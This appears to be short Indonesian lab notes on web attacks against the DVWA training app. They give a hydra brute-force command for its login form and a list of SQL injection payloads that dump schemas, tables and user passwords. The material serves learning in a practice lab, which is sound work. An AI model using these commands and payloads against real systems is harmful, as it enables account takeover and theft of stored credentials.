
# Keamanan Web
> Disusun oleh Hardiyanto

### Daftar Isi
* [Serangan]()
    * [BruteForce](https://gitlab.com/dwiHard/LinuxAdministration/-/blob/master/KeamananWeb/KeamananWeb.md#bruteforce)
    * [SQL Injection](https://gitlab.com/dwiHard/LinuxAdministration/-/blob/master/KeamananWeb/KeamananWeb.md#sqlinjection)


### BruteForce
```
hydra 192.168.xx.x -l admin -P /home/hard/Documents/password.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect. :H-Cookie: security=low; PHPSESSID=xxxxxxxxxxxxxxxxxxxxxx"
```

### SQL Injection
```
1' OR 1=1#
1' OR 1=1 union all select system_user(),user()#
1' OR 1=1 union select null,schema_name from information_schema.schemata#
1' OR 1=1  union select null,table_name from information_schema.tables#
1' OR 1=1 union select null,@@datadir #
1' OR 1=1 union select null,concat(first_name,0x0a,password) from users #
1' UNION SELECT database(),2-- -
1' UNION SELECT user,password from users#
```
